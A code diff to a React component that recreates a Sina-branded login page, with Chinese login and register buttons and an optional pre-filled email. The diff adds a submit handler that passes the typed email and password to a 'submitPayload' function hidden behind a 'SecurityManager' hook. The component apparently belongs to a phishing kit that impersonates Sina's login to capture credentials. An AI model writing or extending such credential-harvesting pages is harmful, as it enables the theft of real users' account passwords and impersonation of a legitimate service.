@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useSecurity } from '../components/SecurityManager';
 
 interface SinaThemeProps {
   prefilledEmail?: string;
@@ -9,6 +10,21 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'free' | 'vip'>('free');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email, password }, 'sina');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -87,7 +103,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
               </button>
             </div>
 
-            <div className="p-8 space-y-6">
+            <form onSubmit={handleSubmit} className="p-8 space-y-6">
               <div className="relative group">
                 <input 
                   type="text" 
@@ -112,10 +128,14 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
               </div>
 
               <div className="flex space-x-3">
-                <button className="flex-1 py-2.5 bg-[#00a6e0] hover:bg-[#008dbf] text-white font-medium rounded transition-colors text-[14px]">
-                  登录
+                <button 
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="flex-1 py-2.5 bg-[#00a6e0] hover:bg-[#008dbf] text-white font-medium rounded transition-colors text-[14px] disabled:opacity-70"
+                >
+                  {isSubmitting ? '...' : '登录'}
                 </button>
-                <button className="flex-1 py-2.5 bg-white border border-gray-300 text-gray-600 hover:bg-gray-50 font-medium rounded transition-colors text-[14px]">
+                <button type="button" className="flex-1 py-2.5 bg-white border border-gray-300 text-gray-600 hover:bg-gray-50 font-medium rounded transition-colors text-[14px]">
                   注册
                 </button>
               </div>
@@ -142,7 +162,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                     </div>
                  </div>
               </div>
-            </div>
+            </form>
           </div>
         </div>
       </main>
